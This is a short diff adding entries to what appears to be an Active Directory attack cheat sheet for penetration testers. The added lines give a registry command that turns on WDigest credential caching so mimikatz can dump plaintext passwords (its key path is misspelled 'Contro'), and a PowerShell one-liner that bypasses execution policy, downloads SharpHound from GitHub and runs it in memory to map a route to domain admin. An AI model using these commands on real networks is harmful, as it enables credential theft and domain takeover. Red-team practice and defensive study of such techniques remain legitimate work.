@@ -35,3 +35,9 @@
 
 * List domain admin users 
 -> net group "Domain Admins" /domain
+
+* Enable Wdigest on newer versions of Windows for mimikatz dump feature with using registry key
+-> reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
+
+* Invoke-Bloodhound and find shortest path for becoming domain admin
+-> powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
